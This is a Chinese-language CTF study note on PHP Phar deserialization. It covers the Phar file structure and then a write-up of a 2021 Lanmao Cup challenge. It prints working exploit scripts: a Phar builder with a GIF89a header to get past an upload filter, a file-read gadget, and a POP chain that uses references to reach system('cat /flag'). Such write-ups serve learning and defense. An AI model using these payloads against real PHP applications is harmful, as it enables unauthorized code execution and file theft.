# Phar反序列化学习笔记

## 简介
PHAR (“Php ARchive”) 是PHP里类似于JAR的一种打包文件，在PHP 5.3 或更高版本中默认开启，这个特性使得 PHP也可以像 Java 一样方便地实现应用程序打包和组件化。一个应用程序可以打成一个 Phar 包，直接放到 PHP-FPM 中运行。

## Phar文件基本结构

### Stub
Stub的基本结构：`...<?php ...;__HALT_COMPILER()?>`...为用户自行填充内容。最终以`__HALT_COMPILER()?>`结尾，否则将无法识别为Phar文件。

### 序列化信息
Phar文件中被压缩的一部分信息，其中data的方式会以序列化的形式储存。（漏洞利用的关键点）

![img](https://raw.githubusercontent.com/Heart-1ess/Heart_1ess-s-CTF-Note/master/library/assets/phar1.png)

### 文件内容
被压缩的文件内容，与漏洞利用目前而言并无太大关系

### 签名格式

![img](https://raw.githubusercontent.com/Heart-1ess/Heart_1ess-s-CTF-Note/master/library/assets/phar2.png)

在notepad++中观察phar的反序列化信息

* 文件头：

![image-20210705182837122](https://raw.githubusercontent.com/Heart-1ess/Heart_1ess-s-CTF-Note/master/library/assets/phar3.png)

* 文件序列化段：

![image-20210705182912899](https://raw.githubusercontent.com/Heart-1ess/Heart_1ess-s-CTF-Note/master/library/assets/phar4.png)

## phar反序列化漏洞

在对已经存在的phar文件进行解析的过程中，meta-data的字段数据会被反序列化，此时可以进行反序列化攻击。

以2021年蓝帽杯半决赛的题目`不一样的web`为例：

在源代码提示中发现可以利用用于读文件的read类和用于反序列化调用的test类如下：

```
class Read{
    public $name;
    public function file_get()
    {
        $text = base64_encode(file_get_contents("lib.php"));
        echo $text;
    }
}
class Test{
    public $f;
    public function __construct($value){
        $this->f = $value;
    }

    public function __wakeup()
    {
        $func = $this->f;
        $func();
    }
}
```

因此可以通过序列化test对象并且利用test对象中的f调用read类中的file_get函数完成读操作，而在源代码提示中又发现了lib.php，因而尝试去读lib的源码

程序如下：

```
<?php

class Read{
    public $name;
    public function file_get()
    {
        $text = base64_encode(file_get_contents("lib.php"));
        echo $text;
    }
}
class Test{
    public $f;
    public function __construct($value){
        $this->f = $value;
    }

    public function __wakeup()
    {
        $func = $this->f;
        $func();
    }
}

    $phar = new Phar('phar.phar');
    $phar -> startBuffering();
    $phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');
    $b = Array('Read','file_get');
    $a = new Test($b);
    $phar -> setMetadata($a);
    $phar -> addFromString('test.txt','test');
    $phar -> stopBuffering();
?>
```

由于网站对于GIF的上传限制，添加`GIF89a`的文件头

该程序的逻辑为在phar文件中反序列化一个Test类型的对象，并设置其f属性为一个数组，即用于调用Read方法中的file_get子函数读取lib.php

读取到lib.php文件如下

```
<?php
error_reporting(0);
class Modifier{
	public $old_id;
	public $new_id;
	public $p_id;
	public function __construct(){
		$this->old_id = "1";
		$this->new_id = "0";
		$this->p_id = "1";
	}
	public function __get($value){
		$new_id = $value;
		$this->old_id = random_bytes(16);
		if($this->old_id===$this->new_id){
			system($this->p_id);
		}
	}
}
class Read{
    public function file_get()
    {
        $text = base64_encode(file_get_contents("lib.php"));
        echo $text;
    }

}
class Files{
	public $filename;
	public function __construct($filename){
		$this->filename = $this->FilesWaf($filename);
	}
	public function __wakeup(){
		$this->FilesWaf($this->filename);
	}
	public function __toString(){
		return $this->filename;
	}
	public function __destruct(){
		echo "Your file is ".$this->FilesWaf($this->filename).".</br>";
		
	}
	public function FilesWaf($name){
		if(stristr($name, "/")!==False){
			return "index.php";
		}
		return $name;
	}
}
class Test{
    public $f;
    public function __construct($value){
        $this->f = $value;
    }

    public function __wakeup()
    {
		$func = $this->f;
        $func();
    }
}
class User{
	public $name;
	public $profile;
	public function __construct($name){
		$this->name = $this->UserWaf($name);
		$this->profile = "I am admin.";
	}
	public function __wakeup(){
		$this->UserWaf($this->name);
	}
	public function __toString(){
		return $this->profile->name;
	}
	public function __destruct(){
		echo "Hello ".$this->UserWaf($this->name).".</br>";
		
	}
	public function UserWaf($name){
		if(strlen($name)>10){
			return "admin";
		}
		if(!preg_match("/[a-f0-9]/iu",$name)){
			return "admin";
		}
		return $name;
	}
}
include("phar://phar.phar");
```

由于lib.php中`__toString`魔术方法中调用了profile属性指向类的name属性，因而需要输出User类的对象来调用`__toString`魔术方法，在Userwaf函数中对于User类的name属性进行调用，最终以字符串形式返回name属性的值，因而可以通过将User类对象的name属性赋值为User类的方式触发`__toString`魔术方法，而为name属性赋值的User类中的profile属性则可以通过赋值为Modifier对象调用内部不存在的属性name触发`__get`函数从而完成到达system函数的路径。找到链子。

给出exp：

```
<?php

class Modifier{
	public $old_id;
	public $new_id;
	public $p_id;
	public function __construct(){
		$this->old_id = "1";
		$this->new_id = "0";
		$this->p_id = "cat /flag";
	}
	public function __get($value){
	}
}

class User{
	public $name;
	public $profile;
	public function __construct($name){
		$this->name = $this->UserWaf($name);
		$this->profile = "I am admin.";
	}
	public function __wakeup(){
		$this->UserWaf($this->name);
	}
	public function __toString(){
		return $this->profile->name;
	}
	public function __destruct(){
		echo "Hello ".$this->UserWaf($this->name).".</br>";
		
	}
	public function UserWaf($name){
		if(strlen($name)>10){
			return "admin";
		}
		if(!preg_match("/[a-f0-9]/iu",$name)){
			return "admin";
		}
		return $name;
	}
}

$phar = new Phar('phar.phar');
$phar -> startBuffering();    
$phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');
$a = new User("abb");
$b = new User("bcc");
$exp = new Modifier;
$a -> name = &$b;
$exp->new_id = &$exp->old_id;
$b -> profile = &$exp;
$phar -> setMetadata($a);
$phar -> addFromString('test.txt','test');
$phar -> stopBuffering();

?>
```





